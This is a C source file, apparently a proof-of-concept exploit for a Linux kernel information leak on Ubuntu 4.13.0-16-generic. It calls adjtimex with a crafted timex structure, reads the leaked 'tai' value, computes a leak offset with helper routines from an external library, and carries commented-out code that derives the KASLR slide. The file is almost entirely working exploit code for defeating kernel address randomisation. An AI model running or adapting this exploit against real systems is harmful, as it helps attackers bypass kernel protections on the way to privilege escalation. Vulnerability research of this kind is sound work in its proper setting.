#define _GNU_SOURCE
#define _BSD_SOURCE
#include <sys/timex.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <kptr-lib.h>

// Ubuntu 4.13.0-16-generic
// gcc -o poc32 poc32.c -m32

void put_kptr(void)
{
	char *data;
	data = mmap(NULL, 0xa000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_LOCKED, -1, 0);
}

struct timex time;

int main(int argc, char **argv)
{
	int r;
	unsigned long long leak_offset, stack_offset, kaslr;
	unsigned int leak_value;
	unsigned int high = 0xffffffff;
	
	memset(&time, 0, sizeof(time));
	time.modes = 0x8000;

    // put sensitive kernel pointer on the leak offset
	//put_kptr();

    // trigger vulnerability
	kptr_api_footprint_stack(&stack_offset);
	adjtimex(&time);
	leak_value = time.tai;
	leak_offset = kptr_api_get_leak_offset(4, (unsigned long long)leak_value, stack_offset);
	printf("leak_offset : %lld\n", leak_offset);

    // print KASLR slide ("_text" symbol address) using leak_value
/*
	printf("leak_value : %lx\n", leak_value);
	memcpy(&kaslr, &leak_value, 4);
	memcpy((char *)&kaslr + 4, &high, 4);
	printf("KASLR Slide : %llx\n", kaslr & (~(0xfffff)));*/

	return 0;
}
